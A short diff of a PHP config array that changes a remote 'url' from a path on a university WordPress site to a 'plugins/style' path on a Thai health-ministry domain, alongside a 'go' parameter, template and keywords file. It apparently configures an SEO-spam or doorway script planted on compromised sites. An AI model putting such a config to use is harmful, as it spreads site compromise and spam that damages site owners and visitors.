@@ -1,6 +1,6 @@
 <?php
 $config = array(
-  	'url'		=> 'http://nurse.sskru.ac.th/wp-includes/style/',
+  	'url'		=> 'https://ministeroffice.moph.go.th/plugins/style/',
 	'parameter' => 'go',
 	'template'  => 'temp.html',
 	'keywords'  => 'bb.txt',
